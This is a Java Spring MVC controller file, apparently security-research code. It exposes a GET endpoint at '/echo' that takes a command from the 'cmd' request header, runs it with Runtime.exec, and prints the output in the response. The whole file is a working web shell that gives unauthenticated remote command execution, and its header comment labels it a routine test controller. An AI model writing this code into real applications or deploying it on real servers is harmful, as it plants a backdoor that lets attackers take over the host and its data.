package summersec.echo.Controller;

import org.springframework.stereotype.Controller;
//import com.management.bean.User;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.*;

/**
 * @ClassName: SpringMVCTestController
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/6/17 18:25
 * @Version: v1.0.0
 * @Description:
 **/
@Controller
class SpringEcho {
    @ResponseBody
    @RequestMapping(value="/echo", method = RequestMethod.GET)
    public SpringEcho Test() throws IOException {

        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
            httpresponse.getWriter().println(res);
        }

        return new SpringEcho();
    }
}
